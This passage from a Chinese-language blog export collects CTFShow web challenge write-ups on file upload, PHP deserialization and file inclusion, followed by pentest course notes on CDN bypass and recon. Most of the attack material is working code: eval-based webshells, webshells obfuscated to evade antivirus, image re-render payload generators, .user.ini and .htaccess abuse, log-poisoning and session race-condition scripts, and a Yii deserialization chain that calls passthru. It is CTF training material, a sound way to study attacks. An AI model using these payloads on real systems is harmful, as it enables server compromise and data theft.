头发现中间件是nginx\n\n```\nnginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式\n\nPHP_INI_USER\t\t\t可以在user.ini中设定\nPHP_INI_PERDIR\t\t可以在php.ini,.htacess,httpd.conf中设定\nPHP_INI_SYSTEM\t\t可以在php.ini,httpd.conf中设定\nPHP_INI_ALL\t\t\t\t随意设定\n\n并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定\n\n那么user.ini中实际有用的配置项有两个：\nauto_append_file \t//在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDID\nauto_prepend_file\n这两项的功能是制定一个文件包含在要执行的文件之后/之前，类似帮助原始文件添加一个require(某文件)\n```\n\n所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\n同上题，过滤了php，大小写绕过\n\n**155**\n\n严格过滤php，所以大小写过不去了，短标签绕过\n\n```PHP\n当php参数:short_open_tag = On时，php可以解析短标签内容\nphp中常见的四种标签的写法：\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。 \n<script language=\"php\"> echo \"CTF\"; </script>\n\n还有一种神奇写法以后会用到\n<?=(表达式)?>  等价于 <?php echo (表达式)?> //无限制  \n```\n\n**156**\n\n过滤了`[  ]`，可用`{  }`代替\n\n**157**\n\n过滤了分号和花括号，用上面的神奇写法直接执行`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\n同上\n\n**159**\n\nsystem貌似没了，用`<?=nl ``../fl*``?>`\n\n**160**\n\n反引号都没了，只能尝试包含访问日志了\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//空格都没给留就离谱\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\n增加了对文件头的检测，其余同上\n\n**162**\n\n.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因\n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"链接\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n\n```\n\n**163**\n\n同上\n\n**164**\n\npng图片二次渲染\n\n```\n在php中包含需要渲染的代码时\n```\n\n直接用大佬脚本生成一张图片咯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //要修改的图片的路径\n/*\n木马内容\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpg图片二次渲染\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n用法  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\n提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n或者\nAddType application/x-httpd-php .png   //将.png后缀的文件解析 成php\n```\n\nOK\n\n**168**\n\n构造免杀木马\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShow反序列化","url":"/posts/17329.html","content":"\n# 反序列化\n\n序列化的概念：把一个对象转为字符串\n\n序列化的好处：\n\n1、有利于数据存储\n\n2、方便数据传递\n\n序列化后字符串的格式\n\n```\nPublic属性序列化后格式：成员名\nPrivate属性序列化后格式：%00类名%00成员名\nProtect属性序列化后格式：%00*%00成员名\n```\n\nO:对象类名长度:\"对象类名\":对象属性个数{属性名类型:属性名长度:\"属性名字\";属性类型:属性长度:\"属性内容\"}\n\n```php\nPHP序列化与反序列化方法：\n1、__construct 当一个对象被创建时调用\n2、__destruct 当一个对象被销毁时调用\n3、__toString 当一个对象被当作一个字符串时使用\n4、__sleep 在对象被序列化之前运行\n5、__wakeup 在对象被反序列化之后调用\n__construct\n// 触发条件，构造函数，当构造一个对象时调用。\n// 对象创建时销毁\n__destruct\n// 触发条件，析构函数，对象销毁时被调用。\n// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容\n__unserialize\n// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup\n__sleep\n// 在对象被序列化之前运行\n__wakeup\n// 在对象被反序列化之后被调用\n__invoke\n// 当对象被调用时执行\n// 函数形式调用对象时，触发的方法\n```\n\n\n\n**254**\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\n按照题中全等于直接构造即可\n\n**255-257**\n\n构造就行\n\n**258**\n\n过滤了`O:数字`的形式，在冒号后加+即可，URLdecode会自动解析成连接的\n\n**259**\n\n什么玩意跳过了\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\n灰溜溜的回来看WP\n\n```\n如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。\n```\n\n\n\n```PHP\n//PHP中原生类\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options\n```\n\n```php\n在构造SoapClient类时，传入数组参数为：\narray('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')\n该类的__call方法可构造请求使其对指定URL发起POST请求\n所以构造该类代码如下\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*相当于构造出以下请求\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //由于Content-Length已经确定，所以后面该类自行构造的请求头失效\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n**260**\n\n就输入那串字符就行\n\n**261**\n\n知识点：在7.4以上版本反序列化会绕过__wakeup()函数\n\n$this->code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字877，构造时使用877开头的文件即可，最终构造内容如下\n\n```PHP\n<?php\n   class ctfshowvip{\n      public $username=\"877.php\";\n      public $password=\"<?php eval(\\$_POST['kkk']);?>\";\n  //这里记得转译，不然会让你传入kkk参数的\n      public $code;\n   }\n   $s=new ctfshowvip();\n   echo serialize($s);\n?>\n//无语Windows Defence把我文件删了😅\n```\n\n**262**\n\n简单轻松解法：\n\n在message.php中直接构造token=admin的类\n\n困难学习解法：\n\n**263**\n\n菜狗直接wp\n\n首先看\n\n```PHP\n//index.php\n$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//明显limti写错了，所以这个代码永远执行的是$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//所以我们就可以控制session中的内容\n```\n\n知识点：session在存储时有两种形式，一种是php，一种是php_serialize\n\n```PHP\n<?php\n\tclass user{\n      public $name=\"jlan\";\n      public $pass=\"123456\";\n  }\n\t$s=new user();\n\t//php存储：user|O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}\n\t//php_serialize存储：a:1:{s:4:\"user\";O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}}\n?>\n```\n\n发现诡异的点了吗，在php存储中，｜是用来分离变量名和序列化后的内容的，所以只要我们构造出序列化好的内容并且在前面加｜就可以让程序进行自动反序列化\n\n继续查看inc/inc.php\n\n```PHP\n//inc/inc.php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\n其中包含`file_put_contents`函数可进行一句话木马的写入\n\n最终构造如下\n\n```PHP\nclass User{\n    public $username=\"1.php\";\n    public $password=\"<?php eval(\\$_POST['kkk']);phpinfo();?>\";\n    public $status='1';\n}\n$s=new User();\necho base64_encode('|'.serialize($s));\n```\n\n首先修改cookie访问主页，然后访问/check.php使得木马文件被写入，最后访问/log-1.php即可\n\n264\n\n**265**\n\n地址传参\n\n```PHP\n<?php\nclass ctfshowAdmin{\n   public $token;\n   public $password;\n   public function __construct(){\n       $this->token='a';\n       $this->password = &$this->token;\n\t}\n}\n$a=new ctfshowAdmin();\necho serialize($a);\n?>\n```\n\n**266**\n\n匹配抛出异常后__destrurt不触发，所以使用大小写绕过即可\n\n**267**\n\nyii框架的反序列化漏洞，利用的类\n\n```PHP\nyii\\db\\BatchQueryResult\n    public function __destruct()\n    {\n        // make sure cursor is closed\n        $this->reset();\n    }\n    public function reset()\n    {\n        if ($this->_dataReader !== null) {\n            $this->_dataReader->close();\n        }\n        $this->_dataReader = null;\n        $this->_batch = null;\n        $this->_value = null;\n        $this->_key = null;\n    }\n\n这里的$this->_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在\nyii\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php\n    public function __call($method, $attributes)\n    {\n        return $this->format($method, $attributes);\n    }\n跟进format\n    public function format($formatter, $arguments = array())\n    {\n        return call_user_func_array($this->getFormatter($formatter), $arguments);\n    }\n跟进getFormatter\n    public function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n                return $this->formatters[$formatter];//这里会返回传入的$formatter的值\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\n发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法\nyii\\rest\\IndexAction.php\n    public function run()\n    {\n        if ($this->checkAccess) {\n            call_user_func($this->checkAccess, $this->id);\n        }\n\n        return $this->prepareDataProvider();\n    }\n在run方法中checkAccess和id都可控，利用链构造成功\n```\n\n利用链\n\n`yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> yii\\rest\\IndexAction::run()`\n\n```php\npoc\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this->_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n?>\n\n```\n\n","tags":["CTF","web"]},{"title":"CTFshow文件包含","url":"/posts/5550.html","content":"\n# 文件包含\n\n常见的文件包含漏洞函数：include()，require()\n\n### 本地包含\n\n#### 利用方式：\n\n###### 1、php://input：\n\n```\n?file=php://input\n请求体内为PHP代码：<?php phpinfo(); ?>\n```\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n遇到file_get_contents()要想到用php://input绕过。\n\n<!--more-->\n\n###### 2、php://filter：\n\n```\n?file=php://filter/rescource=xxx.php\n以base64编码读取\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\n\n###### 3、zip://：\n\n```\n?file=zip://[压缩包绝对路径]#[压缩包内文件]\n```\n\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型的还有zlib://和bzip2://\n\n###### 4、data://：\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\n下面为示例\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n###### 5、phar//：\n\n```\n?file=phar://压缩包路径（相对绝对都可）/压缩包内文件\n```\n\n需要phar://有点类似zip://同样可以导致任意代码执行。~~未来的我补一句，这玩意还是乖乖用来反序列化比较好~~\n\n#### 可供包含的内容：\n\n###### 1、包含Apache日志文件：\n\n###### **条件：对日志文件可读并且知道日志文件的存储目录**\n\n**注意事项：**一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf...）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。\n\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n\n如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n\n可以放在User-Agent中\n\n###### 2、包含SESSION\n\n**条件：**找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到\n\n**常见路径：**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n\n\n###### 3、包含/pros/self/environ\n\n**内容：**proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n**条件：**php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。\n\n###### 4、包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\Winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n无过滤直接伪协议读取flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了data，可通过包含日志来执行命令\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了冒号，日志包含依然可行\n\n##### 82\n\n过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入\n\n```\n原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在/tmp/sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中\n方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含/tmp/sess_name文件\n```\n\n##### 83-86\n\n```Python\n# 竞争万能脚本：\n# os.system('rm -rf /bin/Azuki')\n# 消灭Azuki保平安\nimport io\nimport requests\nimport threading\n\nsessID = 'flag'\nurl = 'http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/'\n\n\ndef write(session):\n    while event.isSet():\n        f = io.BytesIO(b'a' * 1024 * 50)\n        response = session.post(\n            url,\n            cookies={'PHPSESSID': sessID},\n            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"cat *.php\");?>'},\n            files={'file': ('test.txt', f)}\n        )\n\n\ndef read(session):\n    while event.isSet():\n        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))\n        if 'test' in response.text:\n            print(response.text)\n            event.clear()\n        else:\n            print('[*]retrying...')\n\n\nif __name__ == '__main__':\n    event = threading.Event()\n    event.set()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n```\n\n**87**\n\n先贴一个[文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\n对于php://filter的使用\n\n简单版本：使用rot13编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n复杂版本：使用base64编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n原理：在过滤器进行base64编解码时，会绕过所有不属于base64编码后的字符（+, / , 0~9,a~z,A~Z），比如题中的`<?php die(\"大佬别秀了\");?>`，过滤器识别到的字符只有phpdie，其余的字符被忽略，我们只需要在我们已经编好的base64文本加两个字母即可让phpdiexx被解析为base64编码后语句，与后面代码无关了\n\n**88**\n\n构造语句使得base64编码后只含数字和字母即可\n\n```\npayload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7\n//<?php   eval($_POST[1]);\nPOST:\n1=system('tac f*');\n```\n\n","tags":["CTF","web"]},{"title":"小迪","url":"/posts/16397.html","content":"\n# 信息收集\n\n## Day 7 CDN绕过\n\n判断某网站是否使用CDN服务：使用多节点访问，查看返回IP是否相同\n\n#### CDN绕过：\n\n1、子域名查询：xxx.原始域名\n\n子域名查询：https://tool.chinaz.com/subdomain/\n\n2、邮件服务查询：使用邮件服务时大部分不会使用CDN，尝试收取来自该域名的邮件并查看原始邮件标头\n\n3、国外地址请求：针对国内网站，大部分不会开设国外CDN\n\n4、遗留文件，扫描全网：例如phpinfo，探针等，扫描全网使用\n\n5、黑暗搜索引擎搜索特定文件：Shodan，zoomeye，fofa\n\n搜哈希：以网页favicon.ico为例\n\n```python\nimport mmh3\nimport requests\n\nre=requesets.get('地址')\nfav=re.content.encode('base64')\nhas=mh3.hash(fav)\nprint 'http.favicon.hash:'+str(hash)\n```\n\n获得结果后到黑暗引擎中搜索特定内容\n\n6、DNS历史记录\n\n7、~~DDOS打爆~~\n\n8、第三方接口：get-site-ip.com，threatbook.cn\n\n<!--more-->\n\n## DAY 8 架构 搭建 WAF\n\n流程：首先查看是否能获得源码，如果是开源项目可直接去的源码\n\n而后查看服务器的操作系统，搭建平台，数据库类型\n\n进而查看各种站点\n\n最后绕过WAF\n\n攻击目标是否有APP：有的话首先查看是否通过web协议通信，是的话抓取数据包，没有\n\n{% pullquote mindmap mindmap-md %}\n- 信息搜集\n    - 有无web端\n        - 有CDN\n            - 找出真实服务器IP后攻击\n        - 无CDN\n            - 程序源码\n                - 未知CMS\n                - 开源CMS\n        - 服务器信息\n            - 操作系统\n            - 搭建平台\n            - 数据库类型\n        - 站点搭建\n            - 目录站点（从下往上打，只要打通整个根目录下所有站点全部被攻击）\n            - 端口站点\n            - 子域名站点\n            - 旁注站点——同服务器不同站点\n            - C端站点——同网段下不同服务器不同站点\n            - 类似域名站点等\n        - 防护应用WAF——通过脚本嗅探特征\n            - 大部分响应头有X-Powered-By: WAF\n            - 安全狗\n            - 宝塔\n            - 云盾\n            - 安骑士\n    - 有无APP\n        - 走web协议\n            - 抓取数据包走web攻击\n        - 非web协议\n            - 尝试提取\n            - 反编译逆向\n    - 有无其他\n        - 资产信息\n            - 以上各种平台信息\n            - whois备案\n            - github等监控\n        - 第三方应用\n            - 数据库应用\n                - mysql\n                - mssql\n                - oracle\n            - 管理平台\n                - weblogic\n                - phpmyadmin\n            - 第三方应用\n                - vsftpd\n                - nexus\n                - git\n        - 各种服务接口\n            - 存储服务\n            - 支付服务\n            - 内部服务\n        - 微信公众号等位置找到更多的应用\n            - 涉及web\n            - 涉及APP\n            - 涉及其他\n        - 内部群或内部应用等（社工）\n            - QQ或微信群\n            - 工作群\n            - 其他群聊\n\n{% endpullquote %}\n\n## DAY 10 其他资产监控\n\nGitHub监控：便于收集整理最新exp或poc，发现相关测试目标的资产\n\n域名搜集：枚举爆破，利用漏洞，主站爬取，whois查询\n\n\n\n# WEB漏洞\n\n## DAY 11 web漏洞 基础\n\nWEB漏洞类型\n\n{% pullquote mindmap mindmap-md %}\n\n- WEB漏洞\n  - 常见\n    - SQL注入\n      - 危害：获取到隐秘数据，获取管理员账号密码等\n    - 文件上传\n    - XSS跨站\n    - 文件包含\n    - 反序列化\n    - 代码执行\n    - 逻辑安全\n    - 未授权访问\n  - 不常见\n    - CSRF\n    - SSRF\n    - 目录遍历\n      - 产生原因：为方便将需要访问的文件定义成变量，未对传入的文件目录进行过滤，导致某些文件被读取\n      - 危害：服务器中的隐私文件被读取\n      - 攻击方式：扫，往死里扫\n    - 文件读取\n    - 文件下载\n    - 命令执行\n    - XXE安全\n    - 其他\n\n{% endpullquote %}\n\n\n\n## DAY 12，13 web漏洞 SQL注入 简要注入 MySQL注入\n\n**数据库注入基本流程**\n\n首先明确数据库的类型和权限\n\n然后明确提交的方法和参数类型等\n\n注入成功后首先明确数据库记录信息的系统表\n\n然后依次对进行库表列数据进行注入查询\n\n最终目的找到网站后台并登陆尝试获取shell\n\n如果权限较高可通过文件读写，命令执行和注册表读取来getshell\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入\n  - 